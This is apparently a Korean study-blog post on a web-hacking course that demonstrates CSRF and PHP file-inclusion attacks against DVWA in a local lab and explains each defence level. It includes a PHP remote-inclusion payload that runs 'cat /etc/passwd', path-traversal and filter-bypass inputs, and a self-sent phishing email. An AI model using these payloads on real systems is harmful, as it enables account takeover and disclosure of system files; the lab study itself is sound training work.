---
title:  '[강의] 3주차 웹 해킹- 웹 해킹 기술 탐색 2'
excerpt: "week3"

categories:
  - hacking
tags: [study, virtualbox, kalilinux, hacking]

last_modified_at: 2021-07-10T08:06:00-05:00
classes: wide
---

### 6주간의 해킹 스터디 세번째 시간

이번 시간에는 사이트 간 요청 위조를 통해 공격하는 기술인 CSRF 공격과 
주로 PHP 어플리케이션에서 발생하는 파일 인클루젼 공격(LFI & RFI)에 대해 학습하는 시간을 가져보도록 하겠습니다!😉

강의를 듣고 싶으면 여기로 gogo~! => [goormedu](https://edu.goorm.io/lecture/4953/화이트해커가-되기-위한-8가지-웹-해킹-기술)


### CSRF 공격
Cross Site Request Forgery의 약자로 **`사이트 간 요청을 위조`**라고 변역할 수 있다.

피싱을 활용해 사용자가 모르게 패스워드를 변경한다. 

- CSRF 공격 프로세스

사용자가 정상적으로 사이트에 접속하는 동안 해커가 어떤 것을 클릭하도록 피싱을 한다. 만약 사용자가 이것을 클릭하면 클릭한 시점에 
해커가 지정한 패스워드로 패스워드가 변경이 되고 그 다음부터는 변경된 패스워드로 해커가 접속하는 공격이다.

![image](https://user-images.githubusercontent.com/53431568/125088930-dd141180-e108-11eb-8a86-f8d8c3d3be7b.png)

CSRF의 필수조건은 사용자가 해커가 설치한 링크를 클릭한 시점에 로그인이 되어있어야 하는 것이다. 

따라서 이메일이나 특정 게시판에서 신용할 수 없는 사람이 보낸 링크를 클릭하거나 모르는 게시판을 방문할 때 주의하는 습관을 가지자! 👍

<br><br>

### CSRF 공격 실습
LOW 단계
이제 실습을 해보자!

security 는 low로 두고, DVWA 의 CSRF 페이지로 이동해봅시다! 아래와 같이 패스워드를 변경할 수 있는 페이지를 볼 수 있다. 

![image](https://user-images.githubusercontent.com/53431568/125153143-b7305080-e18c-11eb-8312-79f5dd889109.png)

패스워드변경 요청이 어떻게 전송되는지 보기 위해 burpsuite의 proxy-> HTTP history 를 살펴봅시다 🙋🏻‍♂

<br>

먼저 new password와 confirm newpassword 에 임의의 새 패스워드를 입력해 change 버튼을 누르면 proxy에 새로운 요청이 전달된 것을 확인 할 수 있다. normal이라는 값이 두 번 세팅되어 전송되었으며 change 값도 전달이 된 것을 볼 수 있다. => 이 때, 로그인이 되어있는 상태라면 `패스워드가 변경`된다.

![image](https://user-images.githubusercontent.com/53431568/125155781-18f8b680-e19d-11eb-85bc-f07affd7723f.png)

<br>

CSRF 공격에 앞서 이 공격에 대한 history를 하이라이트 하자! 번호 부분을 누르면 색을 지정할 수 있다. (나중에 다시 참고할때 유용한 기능이니 알아두도록!)

![image](https://user-images.githubusercontent.com/53431568/125155803-29109600-e19d-11eb-903b-d21691f95cba.png)

csrf 공격 예제 파일을 사용하였는데 강사님이 올려주신 링크 => [https://raw.githubusercontent.com/SecuAcademy/webhacking/master/csrf.html](https://raw.githubusercontent.com/SecuAcademy/webhacking/master/csrf.html) 를 복사해서 terminal 에서 wget으로 받았다. 

(1) terminal 켜고 ```https://raw.githubusercontent.com/SecuAcademy/webhacking/master/csrf.html``` 명령어 치면 됨

(2) 받아진 파일 복사해서 위치 지정후 저장! `cp csrf.html /opt/lampp/htdocs/` 
    => **이 디렉토리로 파일을 저장하면 외부에서 접근이 가능해진다.**

(3) csrf.html 코드는 강사님이 잘 설명해주셨으니 강의 참고!

이제 간단히 이메일을 통해 피싱을 해보자! ㅎㅎ

> 주의사항! 꼭 내 이메일로 피싱 메일 실습을 하자! 실수로 다른사람한테 보내면.. 큰일납니다.🙀🙀

(4) 이메일 작성

임의로 클릭을 유도할 이메일을 작성하고, 링크는 `http://127.0.0.1/csrf.html`로 설정해준다. 앞에서 htdocs 아래에 파일을 두었으니 외부에서도 접근이 가능하다.

⭐️⭐️ 여기서의 127.0.0.1 사이트는 해커가 만든 사이트라고 생각하면 된다! 정상적이지 않은 루트를 통한 것으로 가정한다. ⭐️⭐️

![hackingemail](https://user-images.githubusercontent.com/53431568/125156010-37ab7d00-e19e-11eb-9034-42d3b1399649.PNG)

작성한 이메일 내용이다 ㅎㅎ 이런식으로 작성하면 된다! 뭔가 로또 담청 이렇게 쓰는게 더 좋았으려나 ㅎㅎ

![email](https://user-images.githubusercontent.com/53431568/125156009-35e1b980-e19e-11eb-8799-1e33a79742d1.PNG)

보내기 한 후, 다음과 같이 이메일을 받았다!

![image](https://user-images.githubusercontent.com/53431568/125155992-1d719f00-e19e-11eb-86c4-48bd93b5ad43.png)
<br>

메일을 열어 확인한 후 **링크**를 클릭하면 csrf.html의 내용이 뜬다. 이제 저 링크를 클릭하자!

![image](https://user-images.githubusercontent.com/53431568/125156097-b3a5c500-e19e-11eb-85b4-2c34c76ee731.png)

HTTP history를 보면 password 가 hacker로 바뀌는 것을 알 수 있다!

![image](https://user-images.githubusercontent.com/53431568/125156106-c1f3e100-e19e-11eb-8148-54d857b5e724.png)

실제로 DVWA에서 로그아웃 후 원래 패스워드로 치면 로그인이 되지 않는다.. hacker로 패스워드를 쳐야 로그인이 된다! 🙀무섭구만..

<br>

#### 공격 내용 분석~

전에 하이라이트로 설정한 history 내용과 csrf 공격으로 온 history 내용을 비교해보자. 두 history를 함께 선택한 후 (ctrl을 누른 채 선택하면 중복선택 가능한거 다 알쥬? ㅎㅎ) 오른쪽 버튼을 눌러 `Send to Comparer (request)` 클릭!

![image](https://user-images.githubusercontent.com/53431568/125156230-6413c900-e19f-11eb-85b3-31bf20a8f08c.png)

compare 메뉴로 이동 하면 두 history의 내용이 올라온 것을 볼 수 있다. 이제 words 클릭!

![image](https://user-images.githubusercontent.com/53431568/125156311-cbca1400-e19f-11eb-8773-946a9cae4636.png)

이제 두 요청을 비교해볼 수 있다.

왼쪽은 csrf로 보내진 요청이고 오른쪽은 정상적인 요청이다. 둘을 비교했을 때 상당히 비슷한 것을 알 수 있다. 웹 브라우저는 cookie가 같다면 정상적인 요청이라고 판단해버린다. 

달라진부분은 password 부분과 refere origin 이라고 하는 헤더부분이다. 이것에 대해서는 아래에 좀 더 자세히 설명해놓았다. 

> referer을 보면 정상적인 것은 localhost (DVWA) 이지만 csrf는 127.0.0.1로 우리가 해커라고 가정한 루트를 이용하였다. 

![image](https://user-images.githubusercontent.com/53431568/125156340-ed2b0000-e19f-11eb-91cb-d36088eaa8b0.png)

<br><br>

### (1) Medium level 의 경우

전 내용은 LOW 일 경우일때의 내용이고 이제 중간단계에서 살펴보자 

똑같이 이메일 피싱에 당한 시나리오를 진행하고  => 클릭!

![image](https://user-images.githubusercontent.com/53431568/125156097-b3a5c500-e19e-11eb-85b4-2c34c76ee731.png)

BurpSuite로 돌아와 최근 history의 response -> render 을 살펴보면 다음과 같이 password가 바뀌지 않은 것을 확인!

![image](https://user-images.githubusercontent.com/53431568/125156614-565f4300-e1a1-11eb-94cd-0d7188d5ffdf.png)


#### 소스코드를 통해 어떻게 막았는지 살펴보자!

HTTP_REFERER 헤더 변수를 검사하고 있다. 어떤 요청이 전송 될 때 이전에 어떤 경로로 부터 요청받았는지 알려주기 위해 웹브라우저가 자동으로 설정하는 헤더이다.

해커가 자기 사이트를 이용해 csrf로 공격을 하면 위에서 127.0.0.1로 설정한 것 처럼 해커 사이트 주소가 REFERER에 설정되게 된다. 

따라서 개발자 입장에서는 REFERE 주소가 서버 주소와 동일한지 비교함으로써 CSRF 공격에 대응한다. 

![image](https://user-images.githubusercontent.com/53431568/125156751-0e8ceb80-e1a2-11eb-938f-269afdae9782.png)

한편, 문제점도 있다. eregi라는 함수는 해당 문자가 **포함이 되었는지** 여부를 확인하는 것이다. 따라서 만약 내 서버 이름이 localhost 이고, 해커가 127.0.0.1/csrf_localhost.html 과 같이 localhost(내 서버에 있는 단어를)를 포함한다면 공격에 당하게 된다. 🥵

<br>


### (2) High level 의 경우
이번엔 high 단계를 실습해 보자.

다시 한번 DVWA에서 패스워드를 normal로 바꾼 후 http history를 살펴보자!

이번에는 user_token이라는 파라미터가 추가된 것을 볼 수 있다.

#### - user_token : csrf 토큰이라고도 하며 csrf 공격에 대응하기 위해 웹페이지가 요청될 때마다 토큰값이 변경된다. 

![image](https://user-images.githubusercontent.com/53431568/125157921-b6a5b300-e1a8-11eb-87fb-af30c6a996da.png)

<br>

다음은 user_token을 변경하면 어떻게 될지 확인하기 위해 password 변경 요청을 intercept 해보겠다. use_token의 마지막 3을 7로 바꿔보겠습니다~7

![image](https://user-images.githubusercontent.com/53431568/125158042-4e0b0600-e1a9-11eb-93a2-0f08b7c8bb8e.png)

변경 후 Forward 해주었더니 패스워드 변경요청이 거부되었음을 확인할 수 있다.

![image](https://user-images.githubusercontent.com/53431568/125158090-ab06bc00-e1a9-11eb-94e9-e1ddf9f994dc.png)

#### 이런식으로 csrf 토큰을 이용해 대응하는 것은 referer 확인과 더불어 추천되는 대응방식이다.

강사님이 올리신 예제파일로 더 실습하고 싶다면 아래 링크로 실습해보자! ⛛

[https://raw.githubusercontent.com/SecuAcademy/webhacking/master/csrfhigh.js](https://raw.githubusercontent.com/SecuAcademy/webhacking/master/csrfhigh.js)


### CSRF 공격 대응 👨‍🏫

Impossible level을 보면서 어떻게 막을 수 있는지 알아보자!

현재 비번을 한번 더 확인차 입력할 것을 요청하고 있다. 이렇게 되면 해커가 기존의 패스워드를 알지 못한다면 공격에 실패하게 된다. 

따라서 이렇게 사용자가 직접 요청을 수행하는지 확인하는 방법이 필요하며, 관리자 기능같은 해커에 악용될 수 있는 공격의 경우에 대한 대비책 마련이 필요하다. 

![image](https://user-images.githubusercontent.com/53431568/125157010-73951100-e1a3-11eb-9b7f-983103451ac2.png)

<br><br>

### 파일인클루젼 공격 

파일 인클루젼 공격은 주로 php 어플리케이션에서 발생한다. 그 이유는 👉 **PHP는 include()라는 함수를 이용해 다른 파일에 소스코드를 직접 포함시킬 수 있기 때문이다.**

이때, include()할 파일을 웹 요청을 통해 지정할 수 있는 경우에 해커가 그 값을 조작하여 원하는 파일을 처리할 수 있도록 만들 수 있다.

크게 두가지로 구분할 수 있다.

- 로컬파일인클루젼(LFI) : 이미 시스템에 존재하는 파일을 인클루드
- 리모트파일인클루젼(RFI) : 좀 더 강력한 공격이며 외부에 있는 파일은 원격으로 인클루드

그림을 통해 알아봅시다 🙋🏻‍♂

- 정상적인 상황 웹 어플리케이션은 file.php를 인클루드 하고 있다. file.php가 웹 요청을 통해 지정되고 있다.

![image](https://user-images.githubusercontent.com/53431568/125090056-e81b7180-e109-11eb-80c7-990ffceb70b8.png)


이때 해커는 file.php 대신 hacker.com 이라는 다른 서버를 구축해 bad.php를 include할 것을 요청한다. 만약 웹 어플리케이션이 입력값을 따로 검사하지 
않는다면, hacker.com으로부터 bad.php를 인클루드 하게 되어 bad.php라는 악성파일을 실행하게 된다.

![image](https://user-images.githubusercontent.com/53431568/125090560-6d068b00-e10a-11eb-98c6-bbc23111d1e6.png)


### 파일인클루젼 공격 
먼저 RFI 공격을 실습해보기 앞서 파일을 만들어 XAMPP로 돌고 있는 웹서버에 올려두고 이것을 원격에 있는 해커사이트로부터 인클루드 시킬 악성파일로 간주하도록 한다.

터미널에서 `gedit /opt/lampp/htdocs/bad.php` 로 text 에디터 열기!

에디터에 아래와 같이 간단한 내용을 출력하게끔 내용을 추가해 주세요!

```php
<?php
	print "RIF Success!! hahahaha";
?>
```

 save 후 주소창에 쳐서 실제로 열리는지 확인하면 다음과 같이 확인!

![image](https://user-images.githubusercontent.com/53431568/125157199-77756300-e1a4-11eb-969e-294b4d210898.png)

<br>

DVWA로 돌아와서 security -> low 로 설정한 후 File Includsion 메뉴로 들어오면 아래와 같은 페이지가 열린다. 하이라이트된 주소를 주목하자.

page=include.php로 되어있는데 include.php 파일이 인클루드되어 전체 페이지를 표시하고 있는 것이다.

[file1.php] - [file2.php] - [file3.php] 이렇게 링크로 되어있는 링크를 누르면 File1에서는 id와 현제 ip주소를 출력하며, File2, File3도 각각 무엇을 실행하는지 살펴보자~

![image](https://user-images.githubusercontent.com/53431568/125157237-b2779680-e1a4-11eb-97a7-0da17b504a15.png)

현재 File includsion 페이지에서 `page=include.php` -> `page=http://127.0.0.1/bad.php` 로 바꿔서 실행하면 다음과 같이 글이 출력된다.

![image](https://user-images.githubusercontent.com/53431568/125157299-2619a380-e1a5-11eb-8059-c2c1271733b0.png)

다음은 php파일에 system이라는 명령어를 추가해본다.

```php
<?php
	print "RIF Success!! hahahaha";
	system('cat /etc/passwd');
?>
```

다시 실행한 결과이다. 난리다. etc/passwd의 내용이 출력된다.

![image](https://user-images.githubusercontent.com/53431568/125157353-7ee93c00-e1a5-11eb-9f39-5b11c2fd1d0f.png)

<br>

다음은 ../를 사용한 공격이다. 

../를 이용해 상위 디렉토리에 접근하는 것을 **`패스트래버설(path traversal) 공격`**이라고 한다.

이런식으로 허가되지 않은 파일을 다운받는 사례도 있다고 한다.. 🥵ㄷㄷ

![image](https://user-images.githubusercontent.com/53431568/125157462-15b5f880-e1a6-11eb-8ab3-8dc8f9cdb55a.png)

<br><br>

### (1) Medium level 의 경우

소스코드를 살펴보면, 입력값을 검증하는 루틴이 생겼다.

http://, https:// 와 같이 원격사이트를 접속하는 부분을 지움으로써 원격접속을 막고 있다. ../ 또한 마찬가지로 패스트래버설 공격도 막고 있다.

![image](https://user-images.githubusercontent.com/53431568/125157542-8fe67d00-e1a6-11eb-9763-1ebb07ddce07.png)

하지만 **문제점**으로는 http와 같은 단어를 한번만 지움으로써 만약 해커가 `page=hthttp://tp://127.0.0.1/bad.php` 와 같이 대응한다면 공격을 당할 수 있다.

<br><br>

### (2) High level 의 경우

미디움 단계에서 허점을 이용해 `page=hthttp://tp://127.0.0.1/bad.php`로 공격을 한 결과 ERROR! 페이지가 나타났다.

![image](https://user-images.githubusercontent.com/53431568/125157608-fcfa1280-e1a6-11eb-9cc6-1651c8054abd.png)

소스코드를 살펴보면, 파일이름이 file로 시작하는지 검사하고 전체 루틴을 통해 페이지 파라미터의 값이 file로 시작하지 않거나 include.php가 아니면 ERROR을 일으킨다.

![image](https://user-images.githubusercontent.com/53431568/125157636-274bd000-e1a7-11eb-9c72-e3369c3cda74.png)

따라서 이런식으로 `file../../../../../../../../etc/passwd` 로 공격한다면 LFI 공격**은** 먹힌다. 단, RFI는 file로 시작해야 하기 때문에 http://를 쓸 수 없어서 방어가 가능하기 때문이다. 

![image](https://user-images.githubusercontent.com/53431568/125157683-6548f400-e1a7-11eb-8cf4-83937f3e5abd.png)

<br><br>

### 파일인클루젼 공격 대응 👨‍🏫

Impossible level을 보면서 어떻게 막을 수 있는지 알아보자!

소스코드를 보면 꼭 필요한 파일만 인클루드 될 수 있도록 대응하고 있다. 

![image](https://user-images.githubusercontent.com/53431568/125157795-e2746900-e1a7-11eb-9089-b2604c8b4b9e.png)

<br>

> 💡 정리하자면 인클루드 되는 파일이 사용자의 입력을 통해 전달되지 않도록 하는것이다. 단, 어쩔 수 없다면 꼭 필요한 파일만 인클루드 될 수 있도록 철저한 검사를 통해 해야한다. 


<br><br>

#### 이미지 출처
  
[https://edu.goorm.io/lecture/4953/화이트해커가-되기-위한-8가지-웹-해킹-기술](https://edu.goorm.io/lecture/4953/화이트해커가-되기-위한-8가지-웹-해킹-기술)
  
